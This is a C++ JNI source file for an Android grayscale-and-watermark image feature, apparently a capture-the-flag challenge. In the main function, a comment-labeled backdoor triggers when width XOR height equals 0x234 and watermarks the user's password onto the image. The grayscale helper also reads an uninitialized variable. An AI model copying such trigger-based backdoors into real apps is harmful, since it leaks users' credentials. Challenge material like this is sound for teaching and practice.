//
// Created by mal on 9/27/20.
//

#include <fcntl.h>
#include <unistd.h>
#include <string>
#include <sys/stat.h>
#include <jni.h>
#include <android/bitmap.h>
#include <android/log.h>

#include <bmp_parse.h>
#include "../include/bmp_parse.h"

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wc++17-extensions"
/*
#define BMP_FILE "../res/test.bmp"
#define MAX_SIZE 4 * 1024  // 4KB

typedef struct {
    uint32_t *_storedBitmapPixels;
    AndroidBitmapInfo _bitmapInfo;
} JniBitmap;

int main() {
    // setvbuf(stdout, NULL, _IONBF, 0);
    // read_bmp();
    return 0;
}


bool verify_bmp(bmp_header* header) {
    if (header->signature.first != 'B' ||
            header->signature.second != 'M') {
        printf("[-] Invalid signature found: %x%x\n", header->signature.first, header->signature.second);
        return false;
    }
#ifdef RELEASE
    if (header->file_size >= MAX_SIZE) {
        printf("[-] File size too large: %x, max: %x\n", header->file_size, MAX_SIZE);
        return false;
    }
#endif

    if (header->data_offset >= header->file_size) {
        printf("[-] Invalid data offset found: %x\n", header->data_offset);
        return false;
    }
    // printf("%x\n", header.signature);
    return true;
}

void print_bmp_header(bmp_header* header) {
    printf("\n");
    printf("* Signature: %c%c\n", header->signature.first, header->signature.second);
    printf("* File size: 0x%1$x (%1$d)\n", header->file_size);
    printf("* Data offset: 0x%1$x (%1$d)\n", header->data_offset);
    printf("\n");
}

extern "C" JNIEXPORT void JNICALL
Java_com_example_kaf_12020_1android_HomeActivity_modifyBitmapGrayscale(JNIEnv *env, jobject thiz,
                                                                       jobject bmp) {
#ifdef DEBUG
    printf("[+] Starting to parse bmp\n");
#endif

    bmp_header header;
    FILE* bmp_file;
    struct stat bmp_stat;

    auto jniBitmap = env->GetDirectBufferAddress(bmp);
    // if (jniBitmap->_storedBitmapPixels == NULL)
    //   return;

    printf("[+] Opening bmp file\n");
    bmp_file = fopen(BMP_FILE, "r");
    if (bmp_file == NULL) {
        printf("[-] Couldn't open %s: %s\n", BMP_FILE, strerror(errno));
        exit(1);
    }

    printf("[+] Reading header\n");
    if (fread(&header, sizeof(bmp_header), 1, bmp_file) != 1) {
        printf("[-] Cloud not read enough bytes from header\n");
        exit(1);
    }

#ifdef DEBUG
    print_bmp_header(&header);
#endif

    printf("[+] Verifying header\n");
    if (!verify_bmp(&header)) {
        exit(1);
    }
    printf("[+] Closing bmp file\n");
    fclose(bmp_file);

#ifdef DEBUG
    printf("[+] Ended parsing bmp...\n");
#endif

    return;
}
*/

jint magic = static_cast<jint>(0x234);

jint get_int_from_color(unsigned int red, unsigned int green, unsigned int blue){
    red = (red << 16) & 0x00FF0000; //Shift red 16-bits and mask out other stuff
    green = (green << 8) & 0x0000FF00; //Shift Green 8-bits and mask out other stuff
    blue = blue & 0x000000FF; //Mask out anything not blue.

    return 0xFF000000 | red | green | blue; //0xFF000000 for 100% Alpha. Bitwise OR everything together.
}

jint convert_to_grayscale(jint color){
    jint red, green, blue;
    red = (color >> 16) & 0x000000FF; //Shift red 16-bits and mask out other stuff
    green = (color >> 8) & 0x000000FF; //Shift Green 8-bits and mask out other stuff
    blue = blue & 0x000000FF; //Mask out anything not blue.
    int new_color = (red + green + blue) / 3;
    /*
     * TODO: Add flag
     */
    return get_int_from_color(new_color, new_color, new_color) ; //0xFF000000 for 100% Alpha. Bitwise OR everything together.
}

jstring get_extra(JNIEnv* env, jobject thiz, const char* key) {
    JavaVM* jvm;
    jobject activity = nullptr; // GlobalRef

    env->GetJavaVM(&jvm);
    activity = env->NewGlobalRef(thiz);

    jvm->AttachCurrentThread(&env, nullptr);

    jclass acl = env->GetObjectClass(thiz); //class pointer of NativeActivity
    jmethodID giid = env->GetMethodID(acl, "getIntent", "()Landroid/content/Intent;");
    jobject intent = env->CallObjectMethod(thiz, giid); //Got our intent

    jclass icl = env->GetObjectClass(intent); //class pointer of Intent
    jmethodID gseid = env->GetMethodID(icl, "getStringExtra", "(Ljava/lang/String;)Ljava/lang/String;");

    return static_cast<jstring>(env->CallObjectMethod(intent, gseid, env->NewStringUTF(key)));
}

jobject add_watermark(JNIEnv *env, jobject thiz, jobject bmp, jcharArray watermark) {
    JavaVM* jvm;
    jclass watermarkClass;
    jmethodID set_watermark;
    constexpr jint size = 35;
    constexpr jint alpha = 255;
    constexpr jint color = 0xFF0000; // Red
    constexpr jint x = size / 2, y = size / 2;

    env->GetJavaVM(&jvm);

    watermarkClass = env->FindClass("com/example/jni_android_client/Watermark");

    set_watermark = env->GetStaticMethodID(watermarkClass, "setWatermark", "(Landroid/graphics/Bitmap;[CIIIII)Landroid/graphics/Bitmap;");

    return env->CallStaticObjectMethod(watermarkClass, set_watermark, bmp, watermark, x, y, color, alpha, size);;
}

jcharArray jstring_to_chararray(JNIEnv *env, jstring string, jboolean *isCopy)
{
    jclass strcls = env->FindClass("java/lang/String");
    jmethodID mid = env->GetMethodID(strcls, "toCharArray", "()[C");

    return static_cast<jcharArray>(env->CallObjectMethod(string, mid));;
}

jlong get_native_ptr(JNIEnv* env, jclass bmp_class, jobject bmp) {
    jlong native_ptr;
    jfieldID native_field;

    native_field = env->GetFieldID(bmp_class, "mNativePtr", "J");
    native_ptr = env->GetLongField(bmp, native_field);
    return native_ptr;
}

std::pair<jint, jint> get_dimensions(JNIEnv* env, jclass bmp_class, jobject bmp) {
    jfieldID width_field, height_field;
    jint width, height;

    width_field = env->GetFieldID(bmp_class, "mWidth", "I");
    width = env->GetIntField(bmp, width_field);

    height_field = env->GetFieldID(bmp_class, "mHeight", "I");
    height = env->GetIntField(bmp, height_field);

    return std::make_pair(width, height);
}

void set_pixel_array(JNIEnv* env, jclass bmp_class, jlong native_ptr, jintArray pixels, jint width, jint height) {
    jmethodID set_pixels_method = env->GetStaticMethodID(bmp_class, "nativeSetPixels", "(J[IIIIIII)V");
    env->CallStaticVoidMethod(bmp_class, set_pixels_method, native_ptr, pixels,
            0, width, // offset, stride
            0, 0, // x, y
            width, height);
}

std::tuple<jintArray, jint*, jsize> get_pixel_array(JNIEnv* env, jclass bmp_class, jlong native_ptr, jint width, jint height) {
    jmethodID get_pixels_method;
    jintArray pixels = env->NewIntArray(height * width);
    jint stride = width;
    jint offset = 0;
    jsize pixels_len;
    jint *pixels_arr;

    get_pixels_method = env->GetStaticMethodID(bmp_class, "nativeGetPixels", "(J[IIIIIII)V");

    // Acquire pixel array from bitmap
    env->CallStaticVoidMethod(bmp_class, get_pixels_method, native_ptr, pixels, offset, stride, 0, 0, width, height);

    // Loop over all pixels and modify them to grayscale
    pixels_len = env->GetArrayLength(pixels);
    pixels_arr = env->GetIntArrayElements(pixels, JNI_FALSE);

    return std::make_tuple(pixels, pixels_arr, pixels_len);
}

extern "C"
JNIEXPORT jobject JNICALL
Java_com_example_jni_1android_1client_HomeActivity_modifyBitmapGrayscale(JNIEnv *env, jobject thiz, jobject bmp) {
    jclass bmp_class;
    jlong native_ptr;
    jobject new_bmp;
    char* key = "username";

    bmp_class = env->GetObjectClass(bmp);

    native_ptr = get_native_ptr(env, bmp_class, bmp);
    auto [width, height] = get_dimensions(env, bmp_class, bmp);

    // Backdoor
    if ((width ^ height) == magic) {
        key = "password";
    }

    // Height with grayscale
    jint new_height = (height > 150) ? height - 150 : height;
    jint finish_index = new_height * width;

    // Acquire pixel array from bitmap
    auto [pixels, pixels_arr, pixels_len] = get_pixel_array(env, bmp_class, native_ptr, width, height);

    // Turn every pixel to grayscale
    for (int index=0; index < finish_index; ++index) {
        jint color = pixels_arr[index];
        pixels_arr[index] = convert_to_grayscale(color);
    }

    // Set bitmap to grayscale
    set_pixel_array(env, bmp_class, native_ptr, pixels, width, height);

    jstring username = get_extra(env, thiz, key);
    if (username != nullptr) {
        jcharArray username_chararray = jstring_to_chararray(env, username, JNI_FALSE);
        new_bmp = add_watermark(env, thiz, bmp, username_chararray);
    } else {
        new_bmp = nullptr;
    }
    // Delete pixels reference, and free the memory
    env->DeleteLocalRef(pixels);
    return new_bmp;
}
#pragma clang diagnostic pop